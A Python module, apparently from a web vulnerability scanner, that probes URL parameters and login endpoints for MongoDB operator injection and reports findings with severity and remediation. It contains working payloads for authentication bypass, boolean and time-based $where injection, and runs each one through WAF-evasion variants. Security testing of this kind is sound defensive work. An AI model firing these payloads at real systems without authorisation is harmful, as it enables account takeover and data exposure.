"""
nosql_scanner.py — NoSQL Injection Scanner
===========================================
Tests query parameters for MongoDB operator injection ($gt, $ne, $regex,
$where) and JSON body injection patterns. Includes boolean-based and
time-based detection.
"""
import json, urllib.parse
from scanners.base_scanner import BaseScanner
from utils.anomaly import TimingAnomalyDetector, SizeAnomalyDetector
from utils.evasion import waf_evade

# Payloads that exploit MongoDB operator injection
NOSQL_PAYLOADS = [
    ('[$ne]', '1'),                         # Operator in param name
    ('[$gt]', ''),                           # Always-true condition
    ('[$regex]', '.*'),                      # Regex match-all
    ('', '{"$gt":""}'),                      # JSON operator in value
    ('', "true, $where: '1==1'"),            # $where injection
]

# Boolean-based payloads for detection
BOOLEAN_TRUE_PAYLOADS = [
    ('[$ne]', ''),
    ('[$gt]', ''),
    ('[$regex]', '.*'),
]

BOOLEAN_FALSE_PAYLOADS = [
    ('[$ne]', '__WSS_NONEXISTENT__'),
    ('[$gt]', '__WSS_NONEXISTENT__'),
    ('[$regex]', '__WSS_NONEXISTENT__'),
]

# Time-based payloads for blind detection
TIME_BASED_PAYLOADS = [
    ('[$where]', "sleep(5000)"),
    ('[$where]', "1; sleep(5000);"),
]

# JSON body injection payloads
JSON_BODY_PAYLOADS = [
    {"username": {"$ne": ""}, "password": {"$ne": ""}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    {"username": "admin", "password": {"$ne": ""}},
    {"$where": "this.username == 'admin'"},
    {"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}},
]


class NosqlScanner(BaseScanner):
    SCANNER_NAME = "NoSQL Injection Scanner"
    _SCANNER_KEY = "nosql"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)

    def run(self) -> list:
        self.log("INFO", f"[NoSQL] Testing NoSQL injection on {self.target}...")
        parsed = urllib.parse.urlparse(self.target)
        qs = urllib.parse.parse_qsl(parsed.query)

        self._timing_detector = TimingAnomalyDetector()
        self._size_detector = SizeAnomalyDetector()

        if not qs:
            self.log("INFO", "[NoSQL] No query parameters found. Testing common auth endpoints...")
            self._test_json_body()
            self._test_time_based_body()
            if not self.vulns:
                self.log("SUCCESS", "[NoSQL] No NoSQL injection detected.")
            return self.vulns

        # Get baseline response
        baseline, _ = self._make_request(self.target)
        if baseline is None:
            return self.vulns

        # 1. Standard operator injection with WAF evasion
        for k, v in qs:
            for suffix, payload_val in NOSQL_PAYLOADS:
                for eva_name, eva_val in waf_evade(str(payload_val)):
                    injected = [(k + suffix if suffix else k_p,
                                 eva_val if k_p == k and not suffix else v_p)
                                for k_p, v_p in qs]
                    if suffix:
                        injected = [(k + suffix, eva_val) if k_p == k else (k_p, v_p)
                                    for k_p, v_p in qs]
                    test_url = parsed._replace(query=urllib.parse.urlencode(injected)).geturl()
                    resp, status = self._make_request(test_url)
                    if resp is not None and len(resp) != len(baseline) and len(resp) > len(baseline) * 1.3:
                        self._report_param(k, eva_name, len(baseline), len(resp))
                        self.log("CRITICAL", f"[NoSQL] Injection detected in param `{k}`!")
                        return self.vulns

        # 2. Boolean-based detection with SizeAnomalyDetector
        self._test_boolean_based(parsed, qs, baseline)

        # 3. Time-based detection with TimingAnomalyDetector
        self._test_time_based(parsed, qs)

        if not self.vulns:
            self.log("SUCCESS", "[NoSQL] No NoSQL injection detected.")
        return self.vulns

    def _test_boolean_based(self, parsed, qs, baseline):
        """Compare true vs false payload responses for boolean-based detection."""
        for k, _ in qs[:3]:
            for suffix, val in BOOLEAN_TRUE_PAYLOADS:
                for eva_name, eva_val in waf_evade(str(val)):
                    injected = [(k + suffix, eva_val) if k_p == k else (k_p, v_p) for k_p, v_p in qs]
                    test_url = parsed._replace(query=urllib.parse.urlencode(injected)).geturl()
                    resp_true, _ = self._make_request(test_url)

                    if resp_true and len(resp_true) != len(baseline):
                        for suffix_f, val_f in BOOLEAN_FALSE_PAYLOADS:
                            injected_f = [(k + suffix_f, val_f) if k_p == k else (k_p, v_p) for k_p, v_p in qs]
                            test_url_f = parsed._replace(query=urllib.parse.urlencode(injected_f)).geturl()
                            resp_false, _ = self._make_request(test_url_f)

                            if resp_false:
                                self._size_detector.record_size(len(resp_true))
                                self._size_detector.record_size(len(resp_false))
                                if self._size_detector.test_size(len(resp_true), 1.5) or self._size_detector.test_size(len(resp_false), 1.5):
                                    if abs(len(resp_true) - len(resp_false)) > len(baseline) * 0.2:
                                        self.add_vuln(
                                            title=f"Boolean-Based NoSQL Injection in parameter `{k}`",
                                            severity="Critical",
                                            category="NoSQL Injection",
                                            cvss_score=9.5,
                                            cwe_ids=["CWE-943"],
                                            owasp_category="A03:2021 – Injection",
                                            confidence="High",
                                            description=(
                                                f"Boolean-based NoSQL injection in `{k}`: true payload `{suffix}={eva_val}` "
                                                f"produced {len(resp_true)}B response while false payload "
                                                f"`{suffix_f}={val_f}` produced {len(resp_false)}B "
                                                f"(baseline: {len(baseline)}B). Query logic was altered by injection."
                                            ),
                                            remediation="Use strict input validation. Never build NoSQL queries from "
                                                "raw user input. Sanitize operators like $gt, $ne, $regex.",
                                            payload=f"{k}{suffix}={eva_val}",
                                            evidence=f"True: {len(resp_true)}B, False: {len(resp_false)}B, Baseline: {len(baseline)}B",
                                            request_details=f"GET {test_url}",
                                            response_details=f"Response size true={len(resp_true)} false={len(resp_false)}",
                                        )
                                        self.log("CRITICAL", f"[NoSQL] Boolean-based injection in `{k}`!")
                                        return

    def _test_time_based(self, parsed, qs):
        """Test for time-based NoSQL injection using $where sleep."""
        self._timing_detector.build_baseline(lambda u, m, d, h, t: self._make_request(u, m, d, h, t), self.target, n=5)

        for k, _ in qs[:2]:
            for suffix, payload_val in TIME_BASED_PAYLOADS:
                for eva_name, eva_val in waf_evade(payload_val):
                    injected = [(k + suffix, eva_val) if k_p == k else (k_p, v_p) for k_p, v_p in qs]
                    test_url = parsed._replace(query=urllib.parse.urlencode(injected)).geturl()
                    _, _, elapsed = self._make_timed_request(test_url, timeout=15)

                    if self._timing_detector.test_payload(f"nosql_time_{k}", elapsed, eva_val, z_threshold=2.5) and elapsed > 3.0:
                        self.add_vuln(
                            title=f"Time-Based NoSQL Injection in parameter `{k}`",
                            severity="Critical",
                            category="NoSQL Injection",
                            cvss_score=9.8,
                            cwe_ids=["CWE-943"],
                            owasp_category="A03:2021 – Injection",
                            confidence="High",
                            description=(
                                f"Time-based NoSQL injection detected via `{suffix}` in param `{k}`: "
                                f"response took {elapsed:.1f}s vs baseline mean {self._timing_detector.mean:.1f}s. "
                                "The `$where` sleep operator was likely executed."
                            ),
                            remediation="Use strict input validation. Never build NoSQL queries from "
                                "raw user input. Reject $where operator in user input.",
                            payload=f"{k}{suffix}={eva_val}",
                            evidence=f"Timing: {elapsed:.1f}s vs baseline {self._timing_detector.mean:.1f}s",
                            request_details=f"GET {test_url}",
                            response_details=f"Response time: {elapsed:.2f}s",
                        )
                        self.log("CRITICAL", f"[NoSQL] Time-based injection in `{k}`!")
                        return

    def _test_json_body(self):
        """Test common login endpoints with JSON operator injection."""
        base = self.target.rstrip("/")
        endpoints = ["/api/login", "/api/auth", "/login", "/api/v1/auth",
                     "/api/users/login", "/auth/login", "/api/signin"]

        for payload in JSON_BODY_PAYLOADS:
            for eva_name, eva_payload_str in waf_evade(json.dumps(payload)):
                try:
                    eva_payload = json.loads(eva_payload_str)
                except Exception as e:
                    eva_payload = payload
                data = json.dumps(eva_payload).encode()
                for ep in endpoints[:4]:
                    url = base + ep
                    body, status = self._make_request(url, "POST", data,
                        {"Content-Type": "application/json"})
                    if body and status == 200 and ("token" in body.lower() or "success" in body.lower()):
                        self._report_json_body(url, eva_payload, body)
                        return

    def _test_time_based_body(self):
        """Test JSON body endpoints with $where sleep for time-based detection."""
        base = self.target.rstrip("/")
        endpoints = ["/api/login", "/api/auth", "/login"]

        for payload_key, payload_val in [("$where", "sleep(5000)")]:
            payload = {payload_key: payload_val}
            data = json.dumps(payload).encode()
            for ep in endpoints[:2]:
                url = base + ep
                _, _, elapsed = self._make_timed_request(url, "POST", data,
                    {"Content-Type": "application/json"}, timeout=15)
                if elapsed > 3.0:
                    self.add_vuln(
                        title=f"Time-Based NoSQL Auth Bypass at {ep}",
                        severity="Critical",
                        category="NoSQL Injection",
                        cvss_score=10.0,
                        cwe_ids=["CWE-943"],
                        owasp_category="A03:2021 – Injection",
                        confidence="High",
                        description=f"$where sleep payload sent to `{url}` produced {elapsed:.1f}s delay, "
                            "suggesting $where operator execution.",
                        remediation="Reject $where operator. Validate JSON input types strictly.",
                        payload=json.dumps(payload),
                        evidence=f"Timing: {elapsed:.1f}s",
                        request_details=f"POST {url}",
                        response_details=f"Response time: {elapsed:.2f}s",
                    )
                    return

    def _report_param(self, param, operator, baseline_len, injected_len):
        self.add_vuln(
            title=f"NoSQL Injection in parameter `{param}`",
            severity="Critical",
            category="NoSQL Injection",
            cvss_score=9.8,
            cwe_ids=["CWE-943"],
            owasp_category="A03:2021 – Injection",
            confidence="High",
            description=f"Injecting MongoDB operator `{operator}` into "
                f"parameter `{param}` produced a significantly different response "
                f"(baseline: {baseline_len} bytes, injected: {injected_len} bytes), "
                f"suggesting the backend query logic was altered.",
            remediation="Use strict input validation. Never build NoSQL queries from "
                "raw user input. Use parameterized queries with ODM libraries "
                "(e.g., Mongoose for MongoDB). Sanitize operators like $gt, $ne, $regex.",
            payload=str(operator),
            evidence=f"Response size: {injected_len}B vs baseline {baseline_len}B",
            request_details=f"Parameter: {param}",
            response_details=f"Response size: {injected_len}",
        )

    def _report_json_body(self, url, payload, body):
        self.add_vuln(
            title=f"NoSQL Auth Bypass via Operator Injection at {url}",
            severity="Critical",
            category="NoSQL Injection",
            cvss_score=10.0,
            cwe_ids=["CWE-943"],
            owasp_category="A03:2021 – Injection",
            confidence="High",
            description=f"Sending `{json.dumps(payload)}` operators to `{url}` "
                f"bypassed authentication and returned a success/token response.",
            remediation="Validate all JSON input types. Reject objects where strings "
                "are expected. Use express-mongo-sanitize or equivalent middleware.",
            payload=json.dumps(payload),
            evidence="HTTP 200 with success/token in response",
            request_details=f"POST {url}",
            response_details=f"Response body: {body[:200]}",
        )
